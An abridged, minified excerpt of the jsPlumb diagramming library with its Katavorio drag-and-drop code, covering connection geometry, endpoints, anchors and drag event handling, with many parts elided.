(function() {
  ...
  function d(a, b, d, e) {
      var f, g, h = b / a, i = d / a, j = e / a, k = (3 * i - Math.pow(h, 2)) / 9, l = (9 * h * i - 27 * j - 2 * Math.pow(h, 3)) / 54, m = Math.pow(k, 3) + Math.pow(l, 2), n = [];
      if (m >= 0)
          ...
          n[1] = -h / 3 - (f + g) / 2,
          n[2] = -h / 3 - (f + g) / 2,
          0 !== Math.abs(Math.sqrt(3) * (f - g) / 2) && (n[1] = -1,
          n[2] = -1);
      else {
  ...
  var e = {
    ...
    , g = Math.pow(2, -f - 1)
    , h = function(a, b) {
      for (var c = [], d = j(a, b), f = b.length - 1, g = 2 * f - 1, h = k(d, g, c, 0), i = e.subtract(a, b[0]), l = e.square(i), m = 0, n = 0; n < h; n++) {
    ...
    , j = function(a, b) {
      for (var c = b.length - 1, d = 2 * c - 1, f = [], g = [], h = [], i = [], j = [[1, .6, .3, .1], [.4, .6, .6, .4], [.1, .3, .6, 1]], k = 0; k <= c; k++)
          f[k] = e.subtract(b[k], a);
      for (var k = 0; k <= c - 1; k++)
          g[k] = e.subtract(b[k + 1], b[k]),
          g[k] = e.scale(g[k], 3);
      for (var l = 0; l <= c - 1; l++)
          for (var m = 0; m <= c; m++)
              h[l] || (h[l] = []),
    ...
    , B = function(a, c, e, f, g) {
      ...
      if (null != m)
          for (var o = 0; o < 3; o++) {
              var p, q = m[o], r = Math.pow(q, 2), s = Math.pow(q, 3), t = [k[0][0] * s + k[0][1] * r + k[0][2] * q + k[0][3], k[1][0] * s + k[1][1] * r + k[1][2] * q + k[1][3]];
...
function() {
  ...
  var a = this
    , b = function(a, b, c) {
      return -1 === a.indexOf(b) && (c ? a.unshift(b) : a.push(b),
      !0)
  }
    , c = function(a, b) {
      var c = a.indexOf(b);
    ...
    , C = function(a, b, c, d) {
      ...
      var l = [0, 0]
        ...
        , p = [0, 0]
        , r = !1
        , s = !1 !== this.params.consumeStartEvent
        , u = this.el
        , w = this.params.clone
        , C = (this.params.scroll,
      !1 !== b.multipleDrop)
        , D = !1
      ...
      this.snap = function(a, b) {
          if (null != u) {
              ...
              var c = this.params.getPosition(u)
      ...
      ;
      var Q = function(a) {
          return "function" == typeof a ? (a._katavorioId = E(),
          a._katavorioId) : a
      }
        , R = {}
        , S = function(a) {
      ...
      this.downListener = function(a) {
          if ((this.rightButtonCanDrag || 3 !== a.which && 2 !== a.button) && this.isEnabled() && this.canDrag())
              if (S(a) && y(a, this.el, this.k)) {
                  if (I) {
                      if (null == (J = h(this.el, a.target || a.srcElement, I)))
                          return
                  } else
                      J = this.el;
                  if (w)
                      if (u = J.cloneNode(!0),
                      this.params.addClass(u, q.clonedDrag),
                      ...
                      null != this.params.parent) {
                          ...
                          u.style.left = b[0] + "px",
                          u.style.top = b[1] + "px",
                          this.params.parent.appendChild(u)
                      } else {
                          var d = f(J);
          ...
          if (l) {
              ...
              if (l) {
                  ...
                  var b = n(a)
                    , c = b[0] - l[0]
                    , d = b[1] - l[1]
                    , e = this.params.ignoreZoom ? 1 : i.getZoom();
                  c /= e,
                  d /= e,
                  this.moveBy(c, d, a),
                  i.updateSelection(c, d, this),
                  i.updatePosses(c, d, this)
              }
          }
      }
      .bind(this),
      this.upListener = function(a) {
          ...
          r = !1,
          w && (u && u.parentNode && u.parentNode.removeChild(u),
          u = null),
          W.length = 0,
          P && !0 === P(this.el, this.params.getPosition(this.el)) && (this.params.setPosition(this.el, m),
          Y("revert", this.el)))
      }
      .bind(this),
      ...
      b.events.start && X.start.push(b.events.start),
      b.events.beforeStart && X.beforeStart.push(b.events.beforeStart),
      b.events.stop && X.stop.push(b.events.stop),
      b.events.drag && X.drag.push(b.events.drag),
      b.events.revert && X.revert.push(b.events.revert),
      ...
      this.off = function(a, b) {
          if (X[a]) {
              for (var c = [], d = 0; d < X[a].length; d++)
                  X[a][d] !== b && c.push(X[a][d]);
              X[a] = c
          }
      }
      ;
      ...
      this.mark = function(a) {
          m = this.params.getPosition(u),
          o = this.params.getPosition(u, !0),
          p = [o[0] - m[0], o[1] - m[1]],
          this.size = this.params.getSize(u),
          V = i.getMatchingDroppables(this),
          v(V, !0, !1, this),
          this.params.addClass(u, this.params.dragClass || c.drag);
          var b;
          b = this.params.getConstrainingRectangle ? this.params.getConstrainingRectangle(u) : this.params.getSize(u.parentNode),
          U = {
              w: b[0],
              h: b[1]
          },
      ...
      this.unmark = function(a, d) {
          if (v(V, !1, !0, this),
          D && G(J) ? (Z = [u.offsetLeft, u.offsetTop],
          J.parentNode.removeChild(u),
          u = J) : Z = null,
          this.params.removeClass(u, this.params.dragClass || c.drag),
          V.length = 0,
          D = !1,
          !d) {
              W.length > 0 && Z && b.setPosition(J, Z),
              W.sort(F);
              for (var e = 0; e < W.length; e++) {
                  if (!0 === W[e].drop(this, a))
                      break
              }
          }
      }
      ...
      this.moveBy = function(a, c, d) {
          ...
          for (var k = 0; k < V.length; k++) {
              ...
              this.params.intersects(i, l) && (C || null == j || j === V[k].el) && V[k].canDrop(this) ? (j || (j = V[k].el),
              W.push(V[k]),
              V[k].setHover(this, !0, d)) : V[k].isHover() && V[k].setHover(this, !1, d)
          }
          Y("drag", {
              el: this.el,
              pos: f,
      ...
      this.params.handle ? T(this.params.handle, !1) : T(this.params.filter, this.params.filterExclude)
  }
    , D = function(a, b, c, d) {
    ...
    , G = function(a) {
      return null == a ? null : null == (a = "string" == typeof a || a.constructor === String ? document.getElementById(a) : a) ? null : (a._katavorio = a._katavorio || E(),
      a)
  };
          ...
          return w(b, function(b) {
              if (null != (b = G(b)))
                  if (null == b._katavorioDrag) {
                      var e = k(c);
                      b._katavorioDrag = new C(b,e,m,o),
      ...
      function a() {
          ...
          this.fire = function(a, b, c) {
              if (this.tick)
                  ...
                  if (this.tick = !0,
                  !this.eventsSuspended && this._listeners[a]) {
          ...
          this.unbind = function(a, b) {
              if (0 === arguments.length)
                  ...
                  2 === arguments.length && r(this._listeners[a] || [], b);
              return this
          }
          ,
...
function() {
      ...
      if (a.getDefaultType) {
          ...
          for (var j = 0, k = a._jsPlumb.types.length; j < k; j++) {
              ...
              if ("__default" !== l) {
                  ...
                  null != m && (i = b.merge(i, m, ["cssClass"], ["connector"]),
                  h(f, m, l))
              }
          }
  ...
  b.extend(a.jsPlumbUIComponent, b.EventGenerator, {
      ...
      toggleType: function(a, b, c) {
          ...
          if (null != d) {
              for (var e = 0, f = d.length; e < f; e++) {
                  ...
                  -1 !== h ? (l(this, h),
                  this._jsPlumb.types.splice(h, 1)) : this._jsPlumb.types.push(d[e])
              }
              j(this, b, c)
          }
      },
      ...
      setHover: function(a, b, d) {
          if (this._jsPlumb && !this._jsPlumb.instance.currentlyDragging && !this._jsPlumb.instance.isHoverSuspended()) {
              ...
              setTimeout(function () {
                null != this.canvas && (null != this._jsPlumb.instance.hoverClass && this._jsPlumb.instance[e](this.canvas, this._jsPlumb.instance.hoverClass),
                null != this._jsPlumb.hoverClass && this._jsPlumb.instance[e](this.canvas, this._jsPlumb.hoverClass));
              }.call(this), e === 'addClass' ? 0 : 300)
              ...
              this._jsPlumb.instance.isSuspendDrawing() || (d = d || c(),
              this.repaint({
                  timestamp: d,
                  recalc: !1
              }))),
  ...
  var m = 0
    ...
    , o = a.jsPlumbInstance = function(d) {
      ...
      .bind(this)
        , J = function(a, b, d, e) {
          if (!D) {
              ...
              i && (g = i.getElementsForDraggable(h)),
              null == d && (d = c());
              var j = ra({
                  elId: h,
                  offset: b,
              ...
              if (f.anchorManager.redraw(h, b, d, null, e),
              g)
                  for (var l in g)
        ...
        , L = function(a, c, d, e, g) {
          if (!p.headless) {
              if (null != c && c && p.isDragSupported(a, f)) {
                  ...
                  if (h = p.extend({}, h),
                  p.isAlreadyDraggable(a, f))
                      d.force && f.initDraggable(a, h);
                  else {
                      var i = p.dragEvents.drag
                        , j = p.dragEvents.stop
                        , k = p.dragEvents.start
                        , l = !1;
                      qa(e, a),
                      h[k] = b.wrap(h[k], function() {
                          if (f.setHoverSuspended(!0),
                          f.select({
                              source: a
                      ...
                      h[i] = b.wrap(h[i], function() {
                          var b = f.getUIPosition(arguments, f.getZoom());
                          null != b && (J(a, b, null, !0),
                          l && f.addClass(a, "jtk-dragged"),
                          l = !0)
                      }),
        ...
        , O = function(a, c) {
          var d = p.extend({}, a);
          if (c && p.extend(d, c),
          d.source && (d.source.endpoint ? d.sourceEndpoint = d.source : d.source = f.getElement(d.source)),
          d.target && (d.target.endpoint ? d.targetEndpoint = d.target : d.target = f.getElement(d.target)),
          a.uuids && (d.sourceEndpoint = K(a.uuids[0]),
          d.targetEndpoint = K(a.uuids[1])),
          d.sourceEndpoint && d.sourceEndpoint.isFull())
              return void b.log(f, "could not add connection; source endpoint is full");
          if (d.targetEndpoint && d.targetEndpoint.isFull())
              return void b.log(f, "could not add connection; target endpoint is full");
          if (!d.type && d.sourceEndpoint && (d.type = d.sourceEndpoint.connectionType),
          d.sourceEndpoint && d.sourceEndpoint.connectorOverlays) {
              d.overlays = d.overlays || [];
              for (var e = 0, g = d.sourceEndpoint.connectorOverlays.length; e < g; e++)
            ...
            , i = function(a, b, c, e) {
              if (d[a] && !d[a].endpoint && !d[a + "Endpoint"] && !d.newConnection) {
                  ...
                  if (g = g ? g[e] : null) {
                      ...
                      g.uniqueEndpoint ? g.endpoint ? i.finalEndpoint = g.endpoint : (g.endpoint = i,
                      i.setDeleteOnEmpty(!1)) : i.setDeleteOnEmpty(!0),
                      0 === b && g.def.connectorOverlays && (d.overlays = d.overlays || [],
                      Array.prototype.push.apply(d.overlays, g.def.connectorOverlays))
                  }
              }
          };
          return !1 !== i("source", 0, this.sourceEndpointDefinitions, d.type || "default") && !1 !== i("target", 1, this.targetEndpointDefinitions, d.type || "default") ? (d.sourceEndpoint && d.targetEndpoint && (M(d.sourceEndpoint, d.targetEndpoint) || (d = null)),
          d) : void 0
      }
      .bind(f)
        , P = function(a) {
        ...
        , T = function(a, b) {
          return p.each(a, function(a) {
              f.isDragSupported(a) && (A[f.getAttribute(a, "id")] = b,
              f.setElementDraggable(a, b))
          })
      }
        , U = function(a, b, c) {
          b = "block" === b;
        ...
        , Y = function(a, c, d) {
          ...
          return e && "undefined" !== e || (2 === arguments.length && void 0 !== arguments[1] ? e = c : (1 === arguments.length || 3 === arguments.length && !arguments[2]) && (e = "jsPlumb_" + g + "_" + H()),
      ...
      this.connect = function(a, c) {
          ...
          if (e) {
              if (null == e.source && null == e.sourceEndpoint)
                  return void b.log("Cannot establish connection - source does not exist");
              if (null == e.target && null == e.targetEndpoint)
                  return void b.log("Cannot establish connection - target does not exist");
              oa(e.source),
              d = P(e),
              Q(d, e)
          }
      ...
      var Z = [{
        ...
        , $ = function(a, b, c, d) {
          var e, f, g, h = Z[c], i = a[h.elId], j = (a[h.el],
          a.endpoints[c]), k = {
              index: c,
      ...
      this.deleteConnection = function(a, c) {
          return !(null == a || (c = c || {},
          !c.force && !b.functionChain(!0, !1, [[a.endpoints[0], ba, [a]], [a.endpoints[1], ba, [a]], [a, ba, [a]], [f, "checkCondition", ["beforeDetach", a]]])) || (a.setHover(!1),
          _(a, !a.pending && !1 !== c.fireEvent, c.originalEvent),
      ...
      this.deleteObject = function(a) {
          var c = {
            ...
            , e = function(b) {
              null != b && null == c.connections[b.id] && (a.dontUpdateHover || null == b._jsPlumb || b.setHover(!1),
          ...
          for (var k in c.endpoints) {
              var l = c.endpoints[k];
              l._jsPlumb && (f.unregisterEndpoint(l),
              l.cleanup(!0),
              l.destroy(!0))
          }
          return c
      ...
      this.select = function(a) {
          return a = a || {},
          a.scope = a.scope || "*",
          la(a.connections || f.getConnections(a, !0))
      }
      ,
      this.selectEndpoints = function(a) {
          ...
          for (var h in v) {
              var i = ha(c, h, !0)
                ...
                , m = "*" !== e;
              if (i || j || l)
                  a: for (var n = 0, o = v[h].length; n < o; n++) {
                      var p = v[h][n];
                      if (ha(f, p.scope, !0)) {
      ...
      var oa = function(a) {
        ...
        , ra = function(a) {
          ...
          !d && c && c === z[g] ? {
              o: a.offset || y[g],
              s: C[g]
          } : (d || !e && null == y[g] ? null != (b = x[g] ? x[g].el : null) && (C[g] = f.getSize(b),
          y[g] = f.getOffset(b),
          z[g] = c) : (y[g] = e || y[g],
          null == C[g] && null != (b = x[g].el) && (C[g] = f.getSize(b)),
          z[g] = c),
          y[g] && !y[g].right && (y[g].right = y[g].left + C[g][0],
      ...
      this.makeAnchor = function() {
          var c, d = function(b, c) {
              if (a.jsPlumb.Anchors[b])
                  return new a.jsPlumb.Anchors[b](c);
          ...
          if ("string" == typeof e)
              ...
              if (b.isArray(e[0]) || b.isString(e[0]))
                  2 === e.length && b.isObject(e[1]) ? b.isString(e[0]) ? (c = a.jsPlumb.extend({
                      elementId: g,
                      jsPlumbInstance: f
                  }, e[1]),
                  h = d(e[0], c)) : (c = a.jsPlumb.extend({
                      elementId: g,
                      jsPlumbInstance: f,
                      anchors: e[0]
                  }, e[1]),
                  h = new a.jsPlumb.DynamicAnchor(c)) : h = new p.DynamicAnchor({
                      anchors: e,
                      selector: null,
                      elementId: g,
                      jsPlumbInstance: f
          ...
          var i = new k(d)
            , j = d._jsPlumb.EndpointDropHandler({
              ...
              getEndpoint: function(b) {
                  ...
                  if (d.uniqueEndpoint && (c.def.endpoint = e),
      ...
      this.makeSource = function(c, d, e) {
          ...
          for (var j = g.maxConnections || -1, k = g.onMaxConnections, n = function(d) {
              ...
              g.createEndpoint && (m.uniqueEndpoint = !0,
              ...
              var u = function(c) {
                  if (3 !== c.which && 2 !== c.button) {
                      ...
                      if (m.enabled) {
                          if (e = this.getId(this.getElement(d.el)),
                          g.filter) {
                              if (!1 === (b.isString(g.filter) ? sa(c, d.el, g.filter, this, g.filterExclude) : g.filter(c, d.el)))
                                  return
                          }
                          var n = this.select({
                              source: e
                          }).length;
                          if (m.maxConnections >= 0 && n >= m.maxConnections)
                              return k && k({
                                  element: d.el,
                                  maxConnections: j
                              }, c),
                              !1;
                          var o = a.jsPlumb.getPositionOnElement(c, i, l)
                            , q = {};
                          a.jsPlumb.extend(q, g),
                          q.isTemporarySource = !0,
                          q.anchor = [o[0], o[1], 0, 0],
                          q.dragOptions = p,
                          m.def.scope && (q.scope = m.def.scope),
                          s = this.addEndpoint(e, q),
                          t = !0,
                          s.setDeleteOnEmpty(!0),
                          m.uniqueEndpoint && (m.endpoint ? s.finalEndpoint = m.endpoint : (m.endpoint = s,
                          s.setDeleteOnEmpty(!1)));
                          var r = function() {
                          ...
                          f.on(s.canvas, "mouseup", r),
                          f.on(d.el, "mouseup", r);
                          var u = {};
                          if (m.def.extract)
                              for (var v in m.def.extract) {
                                  var w = (c.srcElement || c.target).getAttribute(v);
                                  w && (u[m.def.extract[v]] = w)
                              }
                          f.trigger(s.canvas, "mousedown", c, u),
                          b.consume(c)
                      }
                  }
              }
          ...
          .bind(this), o = c.length && c.constructor !== String ? c : [c], p = 0, q = o.length; p < q; p++)
              n(m(o[p]));
          return this
      }
      ,
      ...
      var ua = function(a, c, d) {
          ...
          for (var f = 0; f < c.length; f++) {
              var g = this[c[f]][e];
              if (g && g[d])
                  return g[d].def.scope || this.Defaults.Scope
          }
      }
      .bind(this)
        , va = function(a, c, d, e) {
      ...
      this.setSourceScope = function(a, b, c) {
          va(a, b, "sourceEndpointDefinitions", c),
          this.setDragScope(a, b)
      }
      ,
      this.setTargetScope = function(a, b, c) {
          va(a, b, "targetEndpointDefinitions", c),
      ...
      var wa = function(a, c, d, e, g) {
          ...
          if (g = g || "default",
          c.length && !b.isString(c)) {
              h = [];
              for (var l = 0, n = c.length; l < n; l++)
                  i = m(c[l]),
                  k[i.id] && k[i.id][g] && (h[l] = k[i.id][g].enabled,
                  j = e ? !h[l] : d,
                  k[i.id][g].enabled = j,
                  f[j ? "removeClass" : "addClass"](i.el, "jtk-" + a + "-disabled"))
          } else {
              i = m(c);
              var o = i.id;
              k[o] && k[o][g] && (h = k[o][g].enabled,
              j = e ? !h : d,
              k[o][g].enabled = j,
              f[j ? "removeClass" : "addClass"](i.el, "jtk-" + a + "-disabled"))
          }
      ...
      this.removeAllEndpoints = function(a, b, c) {
          ...
          var d = function(a) {
              ...
              b && h.el && 3 !== h.el.nodeType && 8 !== h.el.nodeType)
                  for (e = 0,
                  g = h.el.childNodes.length; e < g; e++)
                      d(h.el.childNodes[e])
          };
          return d(a),
          this
      ...
      this.setId = function(a, c, d) {
          var e;
          b.isString(a) ? e = a : (a = this.getElement(a),
          e = this.getId(a));
          ...
          c = "" + c,
          d ? a = this.getElement(c) : (a = this.getElement(e),
          this.setAttribute(a, "id", c)),
          v[c] = v[e] || [];
          for (var h = 0, i = v[c].length; h < i; h++)
              v[c][h].setElementId(c),
              v[c][h].setReferenceElement(a);
          delete v[e],
  ...
  b.extend(a.jsPlumbInstance, b.EventGenerator, {
      ...
      registerConnectionType: function(b, c) {
          if (this._connectionTypes[b] = a.jsPlumb.extend({}, c),
          c.overlays) {
      ...
      registerEndpointType: function(b, c) {
          if (this._endpointTypes[b] = a.jsPlumb.extend({}, c),
          c.overlays) {
              for (var d = {}, e = 0; e < c.overlays.length; e++) {
                  var f = this.convertToFullOverlaySpec(c.overlays[e]);
                  d[f[1].id] = f
...
function() {
  var a = this
                  ...
                  for (var j in i)
                      if (i.hasOwnProperty(j)) {
                          var k = jsPlumb.getElement(j)
                            , l = c[j] || a.getOffset(k);
                          if (null == k.offsetParent && null != d[h][j])
                              continue;
                          e || (e = a.getOffset(g)),
                          d[h][j] = {
                              id: j,
    ...
    , k = function(a, b, c) {
      b = j(b),
      void 0 !== a.className.baseVal ? a.className.baseVal = b : a.className = b;
      try {
          var d = a.classList;
          if (null != d) {
              for (; d.length > 0; )
  ...
  a.jsPlumb.extend(a.jsPlumbInstance.prototype, {
      ...
      getPositionOnElement: function(a, b, c) {
          var d = void 0 !== b.getBoundingClientRect ? b.getBoundingClientRect() : {
            ...
            , p = d.width || b.offsetWidth * c || b.clientWidth * c
            , q = d.height || b.offsetHeight * c || b.clientHeight * c;
            var minX = 0,
              minY = 0,
              xarr = [],
              yarr = [];
            if (b.tagName.toLowerCase() === 'path') {
              var pathPoints = b.getAttribute('d'),
              pathPoints = pathPoints.replace(/[LMC]/g, ';').split(';')
              pathPoints.shift()
              pathPoints = pathPoints.map(function (v) {
                  return v.trim().split(' ')
              })
              xarr = pathPoints.map(function (v) {
                return v[0] - 0
              })
              yarr = pathPoints.map(function (v) {
                return v[1] - 0
              })
              minX = Math.min.apply(null, xarr)
              minY = Math.min.apply(null, yarr)
            }
          return [(o[0] + (minX < 0 ? minX / c : 0) - n) / p, q === 0 ? 0: (o[1] + (minY < 0 ? minY * c : 0) - m) / q]
      },
...
function() {
      ...
      if (b.overlays) {
          ...
          for (c in b.overlays) {
              ...
              if (e)
                  ...
                  null != f ? (f.reattach(a._jsPlumb.instance, a),
                  f.setVisible(!0),
  ...
  c.extend(b.OverlayCapableJsPlumbUIComponent, a.jsPlumbUIComponent, {
      ...
      removeOverlay: function(a, b) {
          this._jsPlumb
          var c = this._jsPlumb && this._jsPlumb.overlays[a];
          c && (c.setVisible(!1),
          ...
          this._jsPlumb.overlayPlacements && delete this._jsPlumb.overlayPlacements[a])
      },
...
function() {
  ...
  b.Endpoint = function(a) {
      ...
      !1 !== a.connectionsDetachable && !1 !== a.detachable || (this.connectionsDetachable = !1),
              ...
              if (null != e) {
                  ...
                  if (null == f) {
                      ...
                      if (c && this.anchor.isDynamic && this.connections.length > 0) {
                          ...
                          this.connections.length > 0 && (k.connection = this.connections[0]);
      ...
      this.initDraggable = function() {
          if (!p && b.isDragSupported(this.element)) {
              var g, h = {
                  ...
                  if (!1 === l ? d = !1 : "object" == typeof l ? b.extend(l, g || {}) : l = g || {},
                  !1 === d)
                  ...
                  if (null == m)
                      ...
                      i.fire("connectionDrag", m),
                      0 === y ? (o = [m.source, m.sourceId, s, z],
                      i.anchorManager.sourceChanged(m.endpoints[y].elementId, h.id, m, h.element)) : (o = [m.target, m.targetId, s, z],
                      m.target = h.element,
                      m.targetId = h.id,
                      i.anchorManager.updateOtherEndpoint(m.sourceId, m.endpoints[y].elementId, m.targetId, m)),
              ...
              .bind(this), z = function() {
                  ...
                  m && null != m.endpoints) {
                      ...
                      if (m.endpoints[0 === b ? 1 : 0].anchor.unlock(),
      ...
      var t = function(d, e, f, g) {
          if (b.isDropSupported(this.element)) {
              ...
              h[k] = c.wrap(h[k], function() {
                  ...
                  if (null != d) {
                      ...
                      if (this.isTarget && 0 !== e || d.suspendedEndpoint && this.referenceEndpoint && this.referenceEndpoint.id === d.suspendedEndpoint.id) {
                          ...
                          this[(f ? "add" : "remove") + "Class"](i.endpointDropAllowedClass),
                          this[(f ? "remove" : "add") + "Class"](i.endpointDropForbiddenClass),
              ...
              h[l] = c.wrap(h[l], function() {
                  ...
                  if (null != d) {
                      var e = i.getFloatingAnchorIndex(d);
                      (this.isTarget && 0 !== e || d.suspendedEndpoint && this.referenceEndpoint && this.referenceEndpoint.id === d.suspendedEndpoint.id) && (this.removeClass(i.endpointDropAllowedClass),
...
function() {
    ...
    , d = function(a, d, e, f, g) {
      ...
      null == b.Connectors[d][e]) {
          if (null == b.Connectors[e]) {
              if (a.Defaults.DoNotThrowErrors)
                  return null;
  ...
  b.Connection = function(a) {
      ...
      this.sourceId = a.sourceEndpoint.elementId) : this.sourceId = this._jsPlumb.instance.getId(this.source),
      a.targetEndpoint ? (this.target = a.targetEndpoint.getElement(),
      this.targetId = a.targetEndpoint.elementId) : this.targetId = this._jsPlumb.instance.getId(this.target),
      this.scope = a.scope,
      this.endpoints = [],
      this.endpointStyles = [];
      ...
      this.isDetachable = function(a) {
          return null != a ? !0 === a.connectionsDetachable : !0 === this._jsPlumb.detachable
      }
      ,
  ...
  c.extend(b.Connection, b.OverlayCapableJsPlumbUIComponent, {
      applyType: function(a, c, d) {
          var e = null;
          null != a.connector && (e = this.getCachedTypeItem("connector", d.connector),
          null == e && (e = this.prepareConnector(a.connector, d.connector),
          ...
          null != a.cssClass && this.canvas && this._jsPlumb.instance.addClass(this.canvas, a.cssClass);
          var f = null;
          a.anchor ? null == (f = this.getCachedTypeItem("anchors", d.anchor)) && (f = [this._jsPlumb.instance.makeAnchor(a.anchor), this._jsPlumb.instance.makeAnchor(a.anchor)],
          this.cacheTypeItem("anchors", f, d.anchor)) : a.anchors && null == (f = this.getCachedTypeItem("anchors", d.anchors)) && (f = [this._jsPlumb.instance.makeAnchor(a.anchors[0]), this._jsPlumb.instance.makeAnchor(a.anchors[1])],
          this.cacheTypeItem("anchors", f, d.anchors)),
          null != f && (this.endpoints[0].anchor = f[0],
      ...
      cleanup: function() {
          ...
          this._jsPlumb.instance.fire('connRemoved',{
            node: {
              id: this.getId(),
              el: this.canvas
            }
      ...
      paint: function(a) {
          if (this._jsPlumb && !this._jsPlumb.instance.isSuspendDrawing() && this._jsPlumb.visible) {
              a = a || {};
              var b = a.timestamp
                , c = !1
              ...
              if (null == b || b !== this._jsPlumb.lastPaintedAt) {
                  ...
                  var dockers  = this.getData().dockers
                  var _this = this
              ...
              this._jsPlumb.instance.fire("connPainted", {
                data: {},
                node: {
                  id: this.getId(),
                  el: this.connector.canvas
                }
            })
          }
      },
      ...
      prepareEndpoint: function(a, c, d, f, g, h, i, j) {
          ...
          if (f)
              ...
              d.endpoints[g] = k,
              !1 === h.drawEndpoints && k.setVisible(!1, !0, !0)
          }
          return k
      }
  })
...
function() {
  ...
  c.AnchorManager = function(a) {
        ...
        , q = function(a, b) {
          var c = j.getCachedData(a)
            ...
            , h = function(b, c, d, g, h, i, j) {
              if (g.length > 0)
                  for (var k = p(g, o[b]), m = "right" === b || "top" === b, n = l(b, c, d, k, h, i, m), q = function(a, b) {
      ...
      this.connectionDetached = function(a, c) {
          ...
          d.floatingId && (j(d.floatingIndex, d.floatingEndpoint, d.floatingEndpoint.anchor, d.floatingId, d),
          r(d.floatingEndpoint)),
          r(d.endpoints[0]),
          r(d.endpoints[1]),
          c || (h.redraw(d.sourceId),
      ...
      this.updateOtherEndpoint = function(a, d, e, f) {
          ...
          i > -1 && (g[d].splice(i, 1),
          b.addToList(g, e, [f, f.endpoints[0], f.endpoints[0].anchor.constructor === c.DynamicAnchor])),
      ...
      this.sourceChanged = function(a, d, e, f) {
          if (a !== d) {
              ...
              h > -1 && (g[e.targetId][h][0] = e,
              g[e.targetId][h][1] = e.endpoints[0],
              g[e.targetId][h][2] = e.endpoints[0].anchor.constructor === c.DynamicAnchor),
      ...
      this.rehomeEndpoint = function(a, b, c) {
          ...
          for (var k = 0; k < a.connections.length; k++)
              a.connections[k].sourceId === b ? h.sourceChanged(b, a.elementId, a.connections[k], a.element) : a.connections[k].targetId === b && (a.connections[k].targetId = a.elementId,
              a.connections[k].target = a.element,
              h.updateOtherEndpoint(a.connections[k].sourceId, b, a.elementId, a.connections[k]))
      }
      ,
          ...
          if (!j.isSuspendDrawing()) {
              ...
              for (var u = j.updateOffset({
                  ...
                  if (A || B) {
                      ...
                      var F = j.getCachedData(z)
                        , G = j.getCachedData(y);
                      z === y && (A || B) ? (s(i[y], -Math.PI / 2, 0, x, !1, z, 0, !1, "top", y, p, r),
                      s(i[z], -Math.PI / 2, 0, x, !1, y, 1, !1, "top", z, p, r)) : (D || (D = this.calculateOrientation(y, z, G.o, F.o, x.endpoints[0].anchor, x.endpoints[1].anchor, x),
                      v[C] = D),
                      A && s(i[y], D.theta, 0, x, !1, z, 0, !1, D.a[0], y, p, r),
                      B && s(i[z], D.theta2, -1, x, !0, y, 1, !0, D.a[1], z, p, r)),
                      A && b.addWithFunction(t, y, function(a) {
                          return a === y
                      }),
              ...
              for (w = 0; w < n.length; w++)
                  ...
                  s(i[a], -Math.PI / 2, 0, {
                      endpoints: [n[w], n[w]],
                      paint: function() {}
                  }, !1, a, 0, !1, n[w].anchor.getDefaultFace(), a, p, r),
      ...
      var t = function(a) {
          ...
          this.isDynamic = !0,
          this.isContinuous = !0;
          for (var c = a.faces || ["top", "right", "bottom", "left"], d = !(!1 === a.clockwise), g = {}, h = {
              top: "bottom",
              right: "left",
              left: "right",
              bottom: "top"
          ...
          this.isEdgeSupported = function(a) {
              return null == r ? null == o ? !0 === g[a] : o === a : -1 !== r.indexOf(a)
          }
          ,
  ...
  c.Anchor = function(a) {
      ...
      this.compute = function(a) {
          ...
          d && d === this.timestamp ? this.lastReturnValue : (null != this.userDefinedLocation ? this.lastReturnValue = this.userDefinedLocation : this.lastReturnValue = [b[0] + this.x * c[0] + this.offsets[0], b[1] + this.y * c[1] + this.offsets[1], this.x, this.y],
          this.timestamp = d,
  ...
  c.DynamicAnchor = function(a) {
      ...
      this.compute = function(a) {
          ...
          return null != j ? j : this.isLocked() || null == d || null == h ? e.compute(a) : (a.timestamp = null,
      ...
      this.setAnchorCoordinates = function(a) {
          ...
          return -1 !== b && (this.setAnchor(this.anchors[b]),
          !0)
      }
  }
  ,
          ...
          this.lineIntersection = function(a, b, c, f) {
              ...
              if (k !== l)
                  if (k === 1 / 0 && 0 === l)
                      ...
                      k === 1 / 0 ? (q = a,
                      o(q, g, h) && (r = l * a + m,
                      o(r, b, f) && (n = [q, r]))) : 0 === k ? (r = b,
                      o(r, i, j) && (q = (b - m) / l,
                      o(q, a, c) && (n = [q, r]))) : (q = (p - m) / (l - k),
                      r = l * q + m,
  ...
  b.Connectors.AbstractConnector = function(a) {
      ...
      this.getPathData = function() {
          for (var a = "", c = 0; c < f.length; c++)
              a += b.SegmentRenderer.getPath(f[c], 0 === c),
              a += " ";
          return a
      }
      ,
...
function() {
  ...
  b.Connectors.AbstractBezierConnector = function(a) {
      a = a || {};
      var c, d = !1 !== a.showLoopback, e = (a.curviness,
      a.margin || 5), f = (a.proximityLimit,
  ...
  var a = this
    ...
    , f = function(a) {
      ...
      this._computeBezier = function(a, b, j, k, l, m) {
          ...
          0 === b.targetPos[3] && (q -= h),
          1 === b.targetPos[3] && (q += h);
          var r, s, t, u, v = (n + p) / 2, w = (o + q) / 2, x = d(n, o, p, q), y = Math.sqrt(Math.pow(p - n, 2) + Math.pow(q - o, 2));
...
function() {
  ...
  var a = this
    ...
    , f = function(a) {
      ...
      var c, f, g = b.Connectors.AbstractConnector.apply(this, arguments), h = null == a.midpoint ? .5 : a.midpoint, i = !0 === a.alwaysRespectStubs, j = null, k = null, l = null != a.cornerRadius ? a.cornerRadius : 0, m = (a.loopbackRadius,
      function(a) {
    ...
    , f = function(a, c) {
      ...
      return g || (g = new d({
          ...
          getConstrainingRectangle: function(a) {
              return [a.parentNode && a.parentNode.scrollWidth || 0, a.parentNode && a.parentNode.scrollHeight || 0]
          },
...
function() {
  ...
  var a = this
    ...
    , A = function(c, d) {
      ...
      function q(a) {
          a._katavorioDrag && ((A || z) && a._katavorioDrag.off(h, o),
          A || z || !y || (a._katavorioDrag.off(i, p),
          a._katavorioDrag.setRevert(null)))
      }
      function r(a) {
          a._katavorioDrag && ((A || z) && a._katavorioDrag.on(h, o),
          x && a._katavorioDrag.setConstrain(!0),
          w && a._katavorioDrag.setUseGhostProxy(!0),
          A || z || !y || (a._katavorioDrag.on(i, p),
...
function() {
  ...
  , function(a, b) {
    ...
    , q = function(a) {
      ...
      , k = [], l = {}, m = {}, q = p(a.elements || []), r = a.origin || [0, 0], s = a.executeNow, t = (this.getOrigin = function() {
          return r
      }
      ,
      a.filter || function(a) {
      ...
      , v = a.orderByDistanceFromOrigin, w = new f(r,d), x = a.updateOnStep, y = a.stepInterval || 350, z = a.debug, A = function() {
      ...
      this.addElement = function(a, b) {
          return null == a || !b && -1 !== q.indexOf(a) || q.push(a),
          this
      }
      ,
      this.addElements = function(a, b) {
          if (b)
